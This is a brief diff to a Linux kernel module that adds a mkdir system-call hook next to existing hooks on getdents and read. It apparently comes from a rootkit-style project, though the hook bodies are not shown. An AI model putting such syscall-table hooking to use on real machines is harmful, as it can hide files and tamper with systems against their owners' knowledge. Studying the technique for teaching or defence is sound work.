@@ -6,6 +6,7 @@
 //new system calls
 #include "getdentsShim.h"
 #include "readShim.h"
+#include "mkdirShim.h"
 #include "bootprocess.h"
 
 MODULE_LICENSE("GPL");
@@ -27,6 +28,7 @@ int init_module() {
 	if (bootresult) printk(KERN_INFO "Boot process failed: %d", bootresult);
 	patch(SYS_getdents, getdentsShim);
 	patch(SYS_read, readShim);
+	patch(SYS_mkdir, mkdirShim);
 
 	printk(KERN_INFO "Module loaded\n");
 	return 0;
